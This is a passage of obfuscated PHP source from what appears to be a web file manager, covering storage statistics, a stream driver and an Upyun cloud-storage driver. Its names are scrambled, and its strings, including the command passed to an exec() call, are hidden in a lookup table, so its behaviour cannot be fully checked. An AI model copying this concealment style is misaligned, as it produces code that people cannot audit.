(!$’ÏÂÁ Ó) { $’ÏÂÁ Ó = 1; } $õÆÍ÷÷Ø = array($ªÀµàÆ…[1982] => array($ªÀµàÆ…[1124], $ƒä™¨¡¶)); $À¶Ğš ¬ = Model($ªÀµàÆ…[617])->where($õÆÍ÷÷Ø)->count($ªÀµàÆ…[1820]); return array($ªÀµàÆ…[855] => (int) $²Ë°µé, $ªÀµàÆ…[1983] => (int) ($²Ë°µé - $Ï¨Æ—äŠ), $ªÀµàÆ…[1984] => (int) $Ï¨Æ—äŠ, $ªÀµàÆ…[1985] => (int) $À¶Ğš ¬, $ªÀµàÆ…[1986] => $’ÏÂÁ Ó); } private function optionFile() { $±¦”´¾Ï =& $_SERVER[‰‰Ş‚€]; $çøµ»’¦ = $this->sourceSize(); $ı¼£ËÖÕ = $çøµ»’¦[$±¦”´¾Ï[89]]; $«¤é‚´Ú = $çøµ»’¦[$±¦”´¾Ï[1955]]; $‹ĞÓ¿³è = Model($±¦”´¾Ï[929])->where(array($±¦”´¾Ï[504] => 0))->count($±¦”´¾Ï[202]); $¸ÕÑÓ¿Ø = array($±¦”´¾Ï[504] => 0, $±¦”´¾Ï[242] => array($±¦”´¾Ï[1124], strtotime(date($±¦”´¾Ï[1962])))); $Õû¼¯‘â = Model($±¦”´¾Ï[929])->where($¸ÕÑÓ¿Ø)->sum($±¦”´¾Ï[89]); $³“ÆÏèö = Model($±¦”´¾Ï[929])->where($¸ÕÑÓ¿Ø)->count($±¦”´¾Ï[202]); return array($±¦”´¾Ï[860] => $ı¼£ËÖÕ, $±¦”´¾Ï[1955] => $«¤é‚´Ú, $±¦”´¾Ï[1987] => $ı¼£ËÖÕ - $«¤é‚´Ú, $±¦”´¾Ï[1988] => (int) $Õû¼¯‘â, $±¦”´¾Ï[862] => (int) $‹ĞÓ¿³è, $±¦”´¾Ï[1989] => (int) $³“ÆÏèö); } private function optionAccess() { $³ÌÎß²Ä =& $_SERVER[‰‰Ş‚€]; return array($³ÌÎß²Ä[855] => $this->typeLogCnt(), $³ÌÎß²Ä[118] => $this->typeLogCnt($³ÌÎß²Ä[118]), $³ÌÎß²Ä[543] => $this->typeLogCnt($³ÌÎß²Ä[543]), $³ÌÎß²Ä[1266] => $this->typeLogCnt($³ÌÎß²Ä[1266]), $³ÌÎß²Ä[1990] => $this->typeLogCnt($³ÌÎß²Ä[1990]), $³ÌÎß²Ä[685] => $this->typeLogCnt($³ÌÎß²Ä[22], $³ÌÎß²Ä[1966])); } private function typeLogCnt($¼úÂµİÏ = '', $¬’¶êÖá = "\151\144") { $Ğ°¦û‰È =& $_SERVER[‰‰Ş‚€]; $óÃ·ñÆ“ = array($Ğ°¦û‰È[118] => array($Ğ°¦û‰È[1991], $Ğ°¦û‰È[1992]), $Ğ°¦û‰È[543] => array($Ğ°¦û‰È[1993], $Ğ°¦û‰È[1994]), $Ğ°¦û‰È[1266] => array($Ğ°¦û‰È[1995], $Ğ°¦û‰È[1996], $Ğ°¦û‰È[1997]), $Ğ°¦û‰È[1990] => array($Ğ°¦û‰È[1998], $Ğ°¦û‰È[1999]), $Ğ°¦û‰È[2000] => array($Ğ°¦û‰È[2001], $Ğ°¦û‰È[2002], $Ğ°¦û‰È[2003])); $À°’†åá = strtotime(date($Ğ°¦û‰È[1962])); $íÃ’×©Ô = array($Ğ°¦û‰È[242] => array($Ğ°¦û‰È[1124], $À°’†åá)); if ($¼úÂµİÏ) { $íÃ’×©Ô[$Ğ°¦û‰È[43]] = array($Ğ°¦û‰È[17], $óÃ·ñÆ“[$¼úÂµİÏ]); } $ˆÙ¾ÆôË = Model($Ğ°¦û‰È[1965])->where($íÃ’×©Ô)->count($¬’¶êÖá); return (int) $ˆÙ¾ÆôË; } private function optionServer() { $û„àîœè =& $_SERVER[‰‰Ş‚€]; $Ìì¼Òº³ = $this->diskDriver(); $ÉĞŒçø± = KodIO::defaultDriver(); $ïë¦İÚ¢ = array($û„àîœè[922] => $ÉĞŒçø±[$û„àîœè[491]]); $œ˜ÇÒ°Ô = Model($û„àîœè[564])->where($ïë¦İÚ¢)->sum($û„àîœè[89]); $åışËİ = explode($û„àîœè[63], $_SERVER[$û„àîœè[155]]); $¶öœŠÙ = $åışËİ[0]; $¹ˆ†‰Î = $GLOBALS[$û„àîœè[16]][$û„àîœè[31]]; $ÆƒÊŒÁ· = $¹ˆ†‰Î[$û„àîœè[1086]]; if ($ÆƒÊŒÁ· == $û„àîœè[1074]) { $’ûü¢ë• = explode($û„àîœè[1407], $¹ˆ†‰Î[$û„àîœè[1085]]); $ÆƒÊŒÁ· = $’ûü¢ë•[0]; } if ($ÆƒÊŒÁ· == $û„àîœè[1022] || $ÆƒÊŒÁ· == $û„àîœè[907]) { $¯—äõÍü = Model()->db()->query($û„àîœè[2004]); $ŠÄÛ¯†¼ = $¯—äõÍü[0] && isset($¯—äõÍü[0][$û„àîœè[1706]]) ? $¯—äõÍü[0][$û„àîœè[1706]] : 0; $ÆƒÊŒÁ· = $û„àîœè[2005] . ($ŠÄÛ¯†¼ ? $û„àîœè[18] . $ŠÄÛ¯†¼ : $û„àîœè[22]); } $ìœ³®à = $GLOBALS[$û„àîœè[16]][$û„àîœè[433]][$û„àîœè[931]]; return array($û„àîœè[2006] => $Ìì¼Òº³ ? $Ìì¼Òº³[$û„àîœè[2007]] : 0, $û„àîœè[2008] => $Ìì¼Òº³ ? $Ìì¼Òº³[$û„àîœè[2009]] : 0, $û„àîœè[2010] => (int) $ÉĞŒçø±[$û„àîœè[2007]] * 1024 * 1024 * 1024, $û„àîœè[2011] => (int) $œ˜ÇÒ°Ô, $û„àîœè[2012] => ucfirst($¶öœŠÙ), $û„àîœè[2013] => $û„àîœè[2014] . PHP_VERSION, $û„àîœè[2015] => phpBuild64() ? 64 : 32, $û„àîœè[854] => str_replace($û„àîœè[1248], $û„àîœè[1102], $ÆƒÊŒÁ·), $û„àîœè[433] => ucfirst($ìœ³®à), $û„àîœè[42] => $_SERVER[$û„àîœè[2016]]); } private function diskDriver() { $ÏÖ¼Öœº =& $_SERVER[‰‰Ş‚€]; $ÜàĞÀµñ = $ÏÖ¼Öœº[18]; $¡Ğ½üËƒ = $GLOBALS[$ÏÖ¼Öœº[16]][$ÏÖ¼Öœº[1431]] == $ÏÖ¼Öœº[1432]; if ($¡Ğ½üËƒ) { $ÜàĞÀµñ = $ÏÖ¼Öœº[2017]; if (function_exists($ÏÖ¼Öœº[2018])) { exec($ÏÖ¼Öœº[2019], $¶ƒ¶ÁæÎ); $ÜàĞÀµñ = $¶ƒ¶ÁæÎ[1] . $ÏÖ¼Öœº[18]; } } if (!file_exists($ÜàĞÀµñ)) { return; } if (!function_exists($ÏÖ¼Öœº[2020])) { return; } $×Ê†ë…‹ = @disk_total_space($ÜàĞÀµñ); $ø¢Ò¤÷Å = $×Ê†ë…‹ - @disk_free_space($ÜàĞÀµñ); return array($ÏÖ¼Öœº[2007] => $×Ê†ë…‹, $ÏÖ¼Öœº[2009] => $ø¢Ò¤÷Å); } public function fileChart($ìšµ£ø§) { $ãÂ×ò‹ =& $_SERVER[‰‰Ş‚€]; if (isset($ìšµ£ø§[$ãÂ×ò‹[1820]])) { return Model($ãÂ×ò‹[929])->userFileTypeProfile($ìšµ£ø§[$ãÂ×ò‹[1820]]); } if (isset($ìšµ£ø§[$ãÂ×ò‹[1429]])) { return Model($ãÂ×ò‹[929])->groupFileTypeProfile($ìšµ£ø§[$ãÂ×ò‹[1429]]); } $İÎ„äÒ• = $this->sourceSize(); $÷Ø¸ü» = array($ãÂ×ò‹[201] => 0, $ãÂ×ò‹[199] => 1); $Ø¸’åå© = Model($ãÂ×ò‹[929])->where($÷Ø¸ü»)->sum($ãÂ×ò‹[89]); $÷Ø¸ü»[$ãÂ×ò‹[199]] = 2; $†ÔÑó¬Æ = Model($ãÂ×ò‹[929])->where($÷Ø¸ü»)->sum($ãÂ×ò‹[89]); return array($ãÂ×ò‹[860] => $İÎ„äÒ•[$ãÂ×ò‹[89]], $ãÂ×ò‹[1955] => $İÎ„äÒ•[$ãÂ×ò‹[1955]], $ãÂ×ò‹[1956] => (int) $Ø¸’åå©, $ãÂ×ò‹[1957] => (int) $†ÔÑó¬Æ); } private function sourceSize() { $Ï‰õ¯ğ¾ =& $_SERVER[‰‰Ş‚€]; $ù“ãøÚù = Model($Ï‰õ¯ğ¾[929])->where(array($Ï‰õ¯ğ¾[504] => 0))->sum($Ï‰õ¯ğ¾[89]); $’³éşÉ = Model($Ï‰õ¯ğ¾[564])->sum($Ï‰õ¯ğ¾[89]); if ($’³éşÉ > $ù“ãøÚù) { $’³éşÉ = $ù“ãøÚù; } return array($Ï‰õ¯ğ¾[89] => (int) $ù“ãøÚù, $Ï‰õ¯ğ¾[1955] => (int) $’³éşÉ); } } goto F³á–Î’á“; e†¥œ“¨ğ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($óãß­ƒº, $·ÖŞ—ò– = 0) { parent::__construct(); $this->source = $óãß­ƒº; $this->sourceSize = $·ÖŞ—ò–; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($äÌÀğõº = false) { return $this->sourceSize; } public function getContent($îâĞï§ç = false) { return $this->fileSubstr($îâĞï§ç, 0, $this->sourceSize); } public function fileSubstr($¤¥¹ùÏ = false, $”é»Å©œ = 0, $ÓñÕ¹š– = 0) { if (!$ÓñÕ¹š–) { $ÓñÕ¹š– = $this->sourceSize; } $ÀìÎØ = $this->sourceSize - $”é»Å©œ; if ($ÓñÕ¹š– >= $ÀìÎØ) { $ÓñÕ¹š– = $ÀìÎØ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $”é»Å©œ, $ÓñÕ¹š–); } if ($this->sourceType == self::TYPE_FILE) { if ($ÓñÕ¹š– <= 0) { return $_SERVER[‰‰Ş‚€][22]; } $óõ£å  = ftell($this->source); fseek_64($this->source, $óõ£å  + $”é»Å©œ); $»¨÷¼ì™ = @fread($this->source, $ÓñÕ¹š–); fseek_64($this->source, $óõ£å ); return $»¨÷¼ì™; } } public function hashMd5($×›‡å® = false) { return md5($this->getContent()); } public static function hash($®ôŞö·’, $«ÄÑÎßÅ = 0) { $ŒƒáåéÀ = new PathDriverStream($®ôŞö·’, $«ÄÑÎßÅ); return $ŒƒáåéÀ->hashSimple($®ôŞö·’); } public static function md5($¦µ¶‘µÂ, $Û¾½Ø§ƒ = 0) { $ŸïŞÇ¡ = new PathDriverStream($¦µ¶‘µÂ, $Û¾½Ø§ƒ); return $ŸïŞÇ¡->hashMd5($¦µ¶‘µÂ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\72\x2f\57\x76\60\56\x61\160\x69\x2e\x75\160\171\x75\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($çÙëá½…) { parent::__construct(); $this->_init($çÙëá½…); } public function _init($»ãÚ†õş) { $³“„¯ä¢ =& $_SERVER[‰‰Ş‚€]; foreach ($»ãÚ†õş as $Ã‡ğéãÊ => $û‹Õ¯) { if (isset($this->{$Ã‡ğéãÊ})) { $this->{$Ã‡ğéãÊ} = $û‹Õ¯; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($³“„¯ä¢[1591] . LNG($³“„¯ä¢[1511])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ç ¼“´€, $ğ‰ØÒ¿« = "\x47\x45\124") { $Ò…ôë•ë =& $_SERVER[‰‰Ş‚€]; $òİÙÃ¢ = gmdate($Ò…ôë•ë[1540]); $ĞêáĞ¦ = base64_encode(hash_hmac($Ò…ôë•ë[1592], "{$ğ‰ØÒ¿«}\46{$ç ¼“´€}\46{$òİÙÃ¢}", md5("{$this->userpass}"), !0)); $Âá­®“ = array("\101\x75\164\x68\157\162\x69\x7a\141\164\151\157\x6e\72\x55\120\131\125\x4e\40{$this->username}\x3a{$ĞêáĞ¦}", "\x44\x61\164\145\x3a{$òİÙÃ¢}"); return $Âá­®“; } public function ussRequest($‚åş‘„“, $×Ó•áä§ = "\x47\x45\x54", $Ì÷Ûü…Ò = false, $Ÿ“Ô‰Ó‰ = false, $ïÕ´„Ú² = false) { $ß•­ß“ =& $_SERVER[‰‰Ş‚€]; $‚åş‘„“ = trim($‚åş‘„“, $ß•­ß“[18]); $š¼ğ–â¢ = "\x2f{$this->bucket}\x2f" . rawurlencode($‚åş‘„“); $Ëë“«Ú = $this->ussHeaders($š¼ğ–â¢, $×Ó•áä§); if ($Ÿ“Ô‰Ó‰) { $Ëë“«Ú = array_merge($Ëë“«Ú, $Ÿ“Ô‰Ó‰); } $ƒ£Æ»ù¿ = url_request($this->endpoint . $š¼ğ–â¢, $×Ó•áä§, $Ì÷Ûü…Ò, $Ëë“«Ú, $ïÕ´„Ú²); if (!$ƒ£Æ»ù¿) { $Ë¤™½îå = LNG($ß•­ß“[1593]); $this->writeLog($Ë¤™½îå); return array($ß•­ß“[1336] => !1, $ß•­ß“[1326] => $Ë¤™½îå); } if (strtolower($×Ó•áä§) == $ß•­ß“[238] || in_array($ƒ£Æ»ù¿[$ß•­ß“[1336]], array($ß•­ß“[272], $ß•­ß“[1594]))) { $Ì÷Ûü…Ò = $ƒ£Æ»ù¿[$ß•­ß“[1595]]; if (!$ƒ£Æ»ù¿[$ß•­ß“[846]]) { $Ì÷Ûü…Ò = isset($Ì÷Ûü…Ò[0]) ? $Ì÷Ûü…Ò[0] : $ß•­ß“[22]; } } else { $Ì÷Ûü…Ò = json_decode($ƒ£Æ»ù¿[$ß•­ß“[1326]], !0); if (!$Ì÷Ûü…Ò) { $Ì÷Ûü…Ò = $ƒ£Æ»ù¿[$ß•­ß“[1326]]; } else { if (!$ƒ£Æ»ù¿[$ß•­ß“[846]] && isset($Ì÷Ûü…Ò[$ß•­ß“[1596]])) { $Ì÷Ûü…Ò = $Ì÷Ûü…Ò[$ß•­ß“[1596]]; } } } if (!$ƒ£Æ»ù¿[$ß•­ß“[846]]) { $this->writeLog($this->__errorMessage($Ì÷Ûü…Ò)); } return array($ß•­ß“[1336] => $ƒ£Æ»ù¿[$ß•­ß“[846]], $ß•­ß“[1326] => $Ì÷Ûü…Ò); } private function __errorMessage($›ÀÏØĞ¨) { $È¤÷ì‰œ =& $_SERVER[‰‰Ş‚€]; if (!$›ÀÏØĞ¨) { return $È¤÷ì‰œ[22]; } static $çó†˜øè = null; if (!$çó†˜øè) { $çó†˜øè = I18n::getType(); } if ($çó†˜øè != $È¤÷ì‰œ[1549]) { return $›ÀÏØĞ¨; } $ûúÑì¤å = array($È¤÷ì‰œ[1597] => $È¤÷ì‰œ[1598], $È¤÷ì‰œ[1599] => $È¤÷ì‰œ[1600], $È¤÷ì‰œ[1601] => $È¤÷ì‰œ[1600], $È¤÷ì‰œ[1602] => $È¤÷ì‰œ[1603], $È¤÷ì‰œ[1604] => $È¤÷ì‰œ[1605], $È¤÷ì‰œ[1606] => $È¤÷ì‰œ[1607], $È¤÷ì‰œ[1608] => $È¤÷ì‰œ[1609]); return isset($ûúÑì¤å[$›ÀÏØĞ¨]) ? $ûúÑì¤å[$›ÀÏØĞ¨] : $›ÀÏØĞ¨; } public function mkfile($æø‡Õ›, $•ï¿Šï¯ = '', $ØÂîğ = REPEAT_RENAME) { if ($this->setContent($æø‡Õ›, $•ï¿Šï¯)) { return $this->getPathOuter($æø‡Õ›); } return !1; } public function mkdir($ï–¢ÆÛì, $øò”â®í = REPEAT_SKIP) { $›ïˆ÷ÉÌ =& $_SERVER[‰‰Ş‚€]; $‰¢‘èÙ„ = trim($ï–¢ÆÛì, $›ïˆ÷ÉÌ[18]); if ($this->_isFolder($‰¢‘èÙ„)) { return $this->getPathOuter($‰¢‘èÙ„); } $Ó™Ñãåò = array($›ïˆ÷ÉÌ[1610]); $ŸÈ­ó½ = $this->ussRequest($‰¢‘èÙ„, $›ïˆ÷ÉÌ[298], !1, $Ó™Ñãåò); return $ŸÈ­ó½[$›ïˆ÷ÉÌ[1336]] ? $this->getPathOuter($‰¢‘èÙ„) : !1; } public function copyFile($çÉıŠÛ¤, $ûü‡ŠØê) { $ÁÍÕ—ÃÜ =& $_SERVER[‰‰Ş‚€]; $Œ×’æ€ì = array($ÁÍÕ—ÃÜ[1611] . "\57{$this->bucket}\57{$çÉıŠÛ¤}", $ÁÍÕ—ÃÜ[1612]); $Í¤ïÀ‚ = $this->ussRequest($ûü‡ŠØê, $ÁÍÕ—ÃÜ[264], !1, $Œ×’æ€ì); return $Í¤ïÀ‚[$ÁÍÕ—ÃÜ[1336]] ? !0 : $this->getPathOuter($ûü‡ŠØê); } public function moveFile($¶¹Ô–ßâ, $øÛöŠµÑ) { $‹ˆ—’ÍÃ =& $_SERVER[‰‰Ş‚€]; $Ç¯úş¿² = array($‹ˆ—’ÍÃ[1613] . "\x2f{$this->bucket}\x2f{$¶¹Ô–ßâ}", $‹ˆ—’ÍÃ[1612]); $Ğ·ÖŞ = $this->ussRequest($øÛöŠµÑ, $‹ˆ—’ÍÃ[264], !1, $Ç¯úş¿²); return $Ğ·ÖŞ[$‹ˆ—’ÍÃ[1336]] ? !0 : $this->getPathOuter($øÛöŠµÑ); } public function delFile($©¶óÓ¬ä) { $ñ†ÜŒ®¸ =& $_SERVER[‰‰Ş‚€]; $Ìƒè†ø£ = $this->ussRequest($©¶óÓ¬ä, $ñ†ÜŒ®¸[1614]); return $Ìƒè†ø£[$ñ†ÜŒ®¸[1336]] ? !0 : !1; } public function delFolder($ê‚ñíÃ‰) { $˜»æğ¼â =& $_SERVER[‰‰Ş‚€]; if (!$this->exist($ê‚ñíÃ‰)) { return !0; } $this->listItemCache = !1; $‡ö¤š‰ğ = $ªÀ™©Å¯ = array(); $this->fileList($ê‚ñíÃ‰, $‡ö¤š‰ğ, $ªÀ™©Å¯, !0); $this->listItemCache = !0; foreach ($ªÀ™©Å¯ as $øçì›¦) { $Ÿ¿İ” = $this->ussRequest($øçì›¦[$˜»æğ¼â[42]], $˜»æğ¼â[1614]); if (!$Ÿ¿İ”[$˜»æğ¼â[1336]]) { return !1; } } usort($‡ö¤š‰ğ, function ($¬ÉË¾ï, $ü·š‚Œ) { $ıú™ÚÀí =& $_SERVER[‰‰Ş‚€]; return substr_count($ü·š‚Œ, $ıú™ÚÀí[18]) - substr_count($¬ÉË¾ï, $ıú™ÚÀí[18]); }); foreach ($‡ö¤š‰ğ as $¦öˆŠÏ°) { $Ÿ¿İ” = $this->ussRequest($¦öˆŠÏ°, $˜»æğ¼â[1614]); if (!$Ÿ¿İ”[$˜»æğ¼â[1336]]) { return !1; } } $Ÿ¿İ” = $this->ussRequest($ê‚ñíÃ‰, $˜»æğ¼â[1614]); return $Ÿ¿İ”[$˜»æğ¼â[1336]]; } public function rename($ÍñôÁâ°, $÷äÉÅÇä) { if ($this->isFile($ÍñôÁâ°)) { $÷äÉÅÇä = get_path_father($ÍñôÁâ°) . $÷äÉÅÇä; return $this->moveFile($ÍñôÁâ°, $÷äÉÅÇä); } return $this->renameObject($ÍñôÁâ°, $÷äÉÅÇä); } public function fileInfo($Ú¯ª¹§±, $ÈˆÌÃŠÚ = false, $îÓÂö°¦ = array()) { $‹ôƒü =& $_SERVER[‰‰Ş‚€]; $¼ƒµ†½Ğ = array($‹ôƒü[42] => $this->pathThis($Ú¯ª¹§±), $‹ôƒü[97] => $this->getPathOuter($‹ôƒü[18] . $Ú¯ª¹§±), $‹ôƒü[43] => $‹ôƒü[241], $‹ôƒü[89] => isset($îÓÂö°¦[$‹ôƒü[89]]) ? $îÓÂö°¦[$‹ôƒü[89]] : 0, $‹ôƒü[177] => $this->ext($Ú¯ª¹§±)); if ($ÈˆÌÃŠÚ) { return $¼ƒµ†½Ğ; } $¼ƒµ†½Ğ[$‹ôƒü[242]] = $¼ƒµ†½Ğ[$‹ôƒü[98]] = 0; $¼ƒµ†½Ğ[$‹ôƒü[243]] = $¼ƒµ†½Ğ[$‹ôƒü[244]] = !0; if (empty($îÓÂö°¦)) { $îÓÂö°¦ = $this->objectMeta($Ú¯ª¹§±); if (!$îÓÂö°¦) { return $¼ƒµ†½Ğ; } } $¼ƒµ†½Ğ[$‹ôƒü[242]] = intval($îÓÂö°¦[$‹ôƒü[1615]]); $¼ƒµ†½Ğ[$‹ôƒü[98]] = intval($îÓÂö°¦[$‹ôƒü[1616]]); $¼ƒµ†½Ğ[$‹ôƒü[89]] = $îÓÂö°¦[$‹ôƒü[89]]; return $¼ƒµ†½Ğ; } public function folderInfo($—Ò¾Ã£, $ïè»Ú· = false) { $Æ»Åè¡ö =& $_SERVER[‰‰Ş‚€]; $ÍÜ­€‹ = array($Æ»Åè¡ö[42] => $this->pathThis($—Ò¾Ã£), $Æ»Åè¡ö[97] => $this->getPathOuter($Æ»Åè¡ö[18] . $—Ò¾Ã£), $Æ»Åè¡ö[43] => $Æ»Åè¡ö[88]); if ($ïè»Ú·) { return $ÍÜ­€‹; } $ÍÜ­€‹[$Æ»Åè¡ö[242]] = $ÍÜ­€‹[$Æ»Åè¡ö[98]] = 0; $ÍÜ­€‹[$Æ»Åè¡ö[243]] = $ÍÜ­€‹[$Æ»Åè¡ö[244]] = !0; if (empty($ñ…Ğçï¥)) { $ñ…Ğçï¥ = $this->objectMeta($—Ò¾Ã£); if (!$ñ…Ğçï¥) { return $ÍÜ­€‹; } } $ÍÜ­€‹[$Æ»Åè¡ö[242]] = intval($ñ…Ğçï¥[$Æ»Åè¡ö[1615]]); $ÍÜ­€‹[$Æ»Åè¡ö[98]] = intval($ñ…Ğçï¥[$Æ»Åè¡ö[1616]]); return $ÍÜ­€‹; } private function listObjs($é½Ã×±, $Å½ÍŸüä = 0, $ÉàéÜ‰İ = 1000) { $‹¹¢ú£ =& $_SERVER[‰‰Ş‚€]; $åÒÄº¤İ = array($‹¹¢ú£[1617], $‹¹¢ú£[1618] . $ÉàéÜ‰İ); if ($Å½ÍŸüä) { $åÒÄº¤İ[] = $‹¹¢ú£[1619] . $Å½ÍŸüä; } $›ˆÖ¶Ó = $this->ussRequest($é½Ã×±, $‹¹¢ú£[1542], !1, $åÒÄº¤İ); return !$›ˆÖ¶Ó[$‹¹¢ú£[1336]] ? !1 : $›ˆÖ¶Ó[$‹¹¢ú£[1326]]; } private function fileList($³ˆ°ùÊ¢, &$À¡ùÊÄ, &$Î¦…ÉõÛ, $ÅíÎ¨òş = false) { $‘æñ®¿Ç =& $_SERVER[‰‰Ş‚€]; $ÀÕ¼‰šÀ = $‘æñ®¿Ç[22]; $Ô¯š±– = 1000; $ûÑ¦ÓÄÅ = rtrim($³ˆ°ùÊ¢, $‘æñ®¿Ç[18]) . $‘æñ®¿Ç[18]; while (!0) { check_abort(); $°ÇŞ¾ô¿ = $this->listObjs($³ˆ°ùÊ¢, $ÀÕ¼‰šÀ, $Ô¯š±–); if (!$°ÇŞ¾ô¿) { return !1; } $ÀÕ¼‰šÀ = isset($°ÇŞ¾ô¿[$‘æñ®¿Ç[1620]]) ? $°ÇŞ¾ô¿[$‘æñ®¿Ç[1620]] : $‘æñ®¿Ç[22]; $Ş—»†’¡ = isset($°ÇŞ¾ô¿[$‘æñ®¿Ç[1621]]) ? $°ÇŞ¾ô¿[$‘æñ®¿Ç[1621]] : array(); foreach ($Ş—»†’¡ as $ÔÖøÈ) { $ù¶Õë µ = $ÔÖøÈ[$‘æñ®¿Ç[43]] == $‘æñ®¿Ç[88] ? !0 : !1; $Æ¨œº¸É = ltrim($ûÑ¦ÓÄÅ . $ÔÖøÈ[$‘æñ®¿Ç[42]], $‘æñ®¿Ç[18]) . ($ù¶Õë µ ? $‘æñ®¿Ç[18] : $‘æñ®¿Ç[22]); $›â´¬İÂ = array($‘æñ®¿Ç[42] => $Æ¨œº¸É, $‘æñ®¿Ç[43] => $ù¶Õë µ ? $‘æñ®¿Ç[88] : $‘æñ®¿Ç[241], $‘æñ®¿Ç[89] => $ÔÖøÈ[$‘æñ®¿Ç[421]], $‘æñ®¿Ç[1616] => $ÔÖøÈ[$‘æñ®¿Ç[1622]]); $this->cacheMethodInfoSet($Æ¨œº¸É, $ù¶Õë µ, $›â´¬İÂ); if ($ù¶Õë µ) { $À¡ùÊÄ[] = $Æ¨œº¸É; if ($ÅíÎ¨òş) { $this->fileList($Æ¨œº¸É, $À¡ùÊÄ, $Î¦…ÉõÛ, $ÅíÎ¨òş); } continue; } $Î¦…ÉõÛ[] = $›â´¬İÂ; } if (count($Ş—»†’¡) < $Ô¯š±–) { break; } } $this->cacheMethodInfoSet($³ˆ°ùÊ¢, !0); } public function listPath($Ë¹÷¼¹, $Î½øÒÛÙ = false) { $É³…âë­ =& $_SERVER[‰‰Ş‚€]; $´î®“ıÚ = $—–©–ØŒ = array(); $this->fileList($Ë¹÷¼¹, $´î®“ıÚ, $—–©–ØŒ); foreach ($´î®“ıÚ as $¥ÒÌ¨ì => $›‚¹²êë) { $´î®“ıÚ[$¥ÒÌ¨ì] = $this->folderInfo($›‚¹²êë, $Î½øÒÛÙ); } foreach ($—–©–ØŒ as $¥ÒÌ¨ì => $›‚¹²êë) { $—–©–ØŒ[$¥ÒÌ¨ì] = $this->fileInfo($›‚¹²êë[$É³…âë­[42]], $Î½øÒÛÙ, $›‚¹²êë); } return array($É³…âë­[95] => $´î®“ıÚ, $É³…âë­[96] => $—–©–ØŒ); } public function has($úó‰šöŠ, $Şø£øìÃ = false, $í¢™ÏÖ = true) { $¨ÒöÃ†³ =& $_SERVER[‰‰Ş‚€]; $Õé”ä¬¸ = $¨ÒöÃ†³[22]; $÷Şèşİ = 500; $ââ–âúç = 0; $·¼‰±£ = 0; $Ö¦¦ëØ = rtrim($úó‰šöŠ, $¨ÒöÃ†³[18]) . $¨ÒöÃ†³[18]; while (!0) { check_abort(); $÷Ú…éã· = $this->listObjs($úó‰šöŠ, $Õé”ä¬¸, $÷Şèşİ); if (!$÷Ú…éã·) { return !1; } $Õé”ä¬¸ = isset($÷Ú…éã·[$¨ÒöÃ†³[1620]]) ? $÷Ú…éã·[$¨ÒöÃ†³[1620]] : $¨ÒöÃ†³[22]; $†ù¶ŸÈ• = isset($÷Ú…éã·[$¨ÒöÃ†³[1621]]) ? $÷Ú…éã·[$¨ÒöÃ†³[1621]] : array(); if (empty($†ù¶ŸÈ•)) { break; } $÷˜¬ª’¦ = array_filter($†ù¶ŸÈ•, function ($´ÀÚÄÂÒ) { $µÍ¡Êáî =& $_SERVER[‰‰Ş‚€]; return $´ÀÚÄÂÒ[$µÍ¡Êáî[43]] == $µÍ¡Êáî[88]; }); $ŠÌßê¾ = count($†ù¶ŸÈ•); $÷˜¬ª’¦ = count($÷˜¬ª’¦); $›ø®ª™Õ = $ŠÌßê¾ - $÷˜¬ª’¦; if ($Şø£øìÃ) { $·¼‰±£ += $÷˜¬ª’¦; $ââ–âúç += $›ø®ª™Õ; if ($ŠÌßê¾ < $÷Şèşİ) { break; } continue; } if ($í¢™ÏÖ) { if ($›ø®ª™Õ) { return !0; } } else { if ($÷˜¬ª’¦) { return !0; } } if ($ŠÌßê¾ < $÷Şèşİ) { break; } } if ($Şø£øìÃ) { return array($¨ÒöÃ†³[250] => $ââ–âúç, $¨ÒöÃ†³[251] => $·¼‰±£); } return !1; } public function listAll($çêŠÖò) { $”µı§Ê =& $_SERVER[‰‰Ş‚€]; $˜¶ŸÌÍ = $»€¿ˆ±½ = array(); $this->fileList($çêŠÖò, $˜¶ŸÌÍ, $»€¿ˆ±½, !0); $îŒõÉñ” = array_to_keyvalue($»€¿ˆ±½, $”µı§Ê[42]); foreach ($˜¶ŸÌÍ as $Œ†Ô­’ò) { if (is_string($Œ†Ô­’ò)) { $îŒõÉñ”[$Œ†Ô­’ò] = array($”µı§Ê[89] => 0); } } return $this->listAllFiles($çêŠÖò, $îŒõÉñ”); } public function canRead($éĞç¤á¨) { return $this->exist($éĞç¤á¨) ? !0 : !1; } public function canWrite($Ã‚ÔÇ”ô) { return $this->exist($Ã‚ÔÇ”ô) ? !0 : !1; } public function getContent($¹Ç¯î™§) { return $this->fileSubstr($¹Ç¯î™§, 0, -1); } public function setContent($ÄäˆÆ—ª, $Ğåœ¨Í¼ = '') { $«Ö„ß¿Ô =& $_SERVER[‰‰Ş‚€]; if (!$Ğåœ¨Í¼) { $êÏ¹§ˆ» = $this->ussRequest($ÄäˆÆ—ª, $«Ö„ß¿Ô[298]); return $êÏ¹§ˆ»[$«Ö„ß¿Ô[1336]]; } $Ú„•´‚ = $this->tempFile($this->pathThis($ÄäˆÆ—ª)); file_put_contents($Ú„•´‚, $Ğåœ¨Í¼); if ($this->upload($ÄäˆÆ—ª, $Ú„•´‚)) { $this->tempFileRemve($Ú„•´‚); return !0; } return !1; } public function fileSubstr($Ä›Û†€°, $ıØ”†õÊ, $‘ÕˆĞ…ö) { $ÏˆÆ“ö¸ =& $_SERVER[‰‰Ş‚€]; if (!($úš’Šñ = $this->link($Ä›Û†€°))) { return !1; } $Õ…†„° = !1; if ($‘ÕˆĞ…ö > 0) { $ÀÄ¹ÌÚ° = $ıØ”†õÊ + $‘ÕˆĞ…ö - 1; $Õ…†„° = array($ÏˆÆ“ö¸[1581] . $ıØ”†õÊ . $ÏˆÆ“ö¸[481] . $ÀÄ¹ÌÚ°); } $•¬åî‘ = url_request($úš’Šñ, $ÏˆÆ“ö¸[1542], !1, $Õ…†„°); return $•¬åî‘[$ÏˆÆ“ö¸[846]] ? $•¬åî‘[$ÏˆÆ“ö¸[1326]] : !1; } public function 